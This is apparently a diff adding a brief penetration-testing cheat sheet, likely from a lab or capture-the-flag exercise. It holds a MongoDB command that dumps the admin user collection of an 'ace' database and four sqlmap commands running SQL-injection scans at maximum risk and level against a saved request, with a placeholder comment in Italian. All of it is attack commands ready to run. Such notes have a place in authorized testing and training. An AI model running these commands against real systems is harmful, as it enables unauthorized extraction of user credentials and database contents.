@@ -1,0 +1,9 @@
+[MONGO USER ENUMERATION]
+# find user admin on mongo db
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+
+[SQLMAP SCAN]
+sqlmap -r request.txt --risk 3 --level 5 --batch --technique=BU
+sqlmap -r request.txt --risk 3 --level 5 --batch --technique=BU --dbs
+sqlmap -r request.txt --risk 3 --level 5 --batch --technique=BU --dbs --batch
+sqlmap -r request.txt --risk 3 --level 5 --batch --technique=BU --dbs -p <parametro da testare>
